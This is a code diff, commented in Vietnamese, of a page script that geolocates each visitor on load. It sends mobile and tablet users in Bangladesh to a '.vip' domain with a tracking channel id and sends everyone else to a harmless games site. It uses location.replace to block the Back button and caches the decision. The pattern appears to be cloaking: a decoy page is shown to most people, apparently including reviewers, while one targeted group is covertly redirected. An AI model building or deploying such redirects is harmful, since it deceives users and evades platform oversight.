@@ -20,13 +20,20 @@
   <script>
   (function () {
     // 🔗 LINK ĐÃ GẮN SẴN
-    const BD_URL    = "https://www.khcyz.vip/?ch=4f80366d81"; // Bangladesh
-    const OTHER_URL = "https://poki.com";                      // Các nước khác
+    const BD_URL    = "https://www.khcyz.vip/?ch=4f80366d81"; // Trang A: chỉ cho BD + mobile
+    const OTHER_URL = "https://poki.com";                      // Trang B: mọi trường hợp còn lại
 
     // ⏱ Thời gian delay (ms)
-    const DELAY = 1000; // 1 giây (có thể đổi 1500 hoặc 2000)
+    const DELAY = 1000; // 1 giây (có thể đổi 1500 / 2000)
 
-    const CACHE_KEY = "geo_redirect_target_v1"; // key lưu trong sessionStorage
+    const CACHE_KEY = "geo_device_redirect_v1"; // key lưu trong sessionStorage
+
+    // Hàm check mobile / tablet
+    function isMobileOrTablet() {
+      var ua = navigator.userAgent || navigator.vendor || window.opera;
+      var mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i;
+      return mobileRegex.test(ua);
+    }
 
     function safeGetCache() {
       try {
@@ -44,18 +51,19 @@
       }
     }
 
+    // targetFlag: "A" (BD + mobile) hoặc "B" (các trường hợp khác)
     function go(targetFlag) {
-      var url = targetFlag === "BD" ? BD_URL : OTHER_URL;
+      var url = (targetFlag === "A") ? BD_URL : OTHER_URL;
 
-      // Dùng replace để tránh user bấm Back quay về trang check
+      // Dùng replace để tránh user bấm Back quay lại trang check
       setTimeout(function () {
         window.location.replace(url);
       }, DELAY);
     }
 
-    // 1️⃣ Nếu đã có cache → không gọi API, redirect nhanh hơn
+    // 1️⃣ Nếu đã có cache → không gọi API nữa, redirect nhanh hơn
     var cached = safeGetCache();
-    if (cached === "BD" || cached === "OTHER") {
+    if (cached === "A" || cached === "B") {
       go(cached);
       return;
     }
@@ -69,20 +77,20 @@
         code = (code || "").toString().trim().toUpperCase();
 
         var flag;
-        if (code === "BD") {
-          flag = "BD";
+        // ✅ CHỈ KHI BD + MOBILE/TABLET MỚI VÀO TRANG A
+        if (code === "BD" && isMobileOrTablet()) {
+          flag = "A";   // BD + mobile → Web A
         } else {
-          flag = "OTHER";
+          flag = "B";   // còn lại → Web B
         }
 
-        // Lưu lại để lần sau không phải gọi API nữa
         safeSetCache(flag);
         go(flag);
       })
       .catch(function () {
-        // Nếu lỗi API → mặc định coi như OTHER
-        safeSetCache("OTHER");
-        go("OTHER");
+        // Nếu lỗi API → mặc định cho sang B
+        safeSetCache("B");
+        go("B");
       });
   })();
   </script>
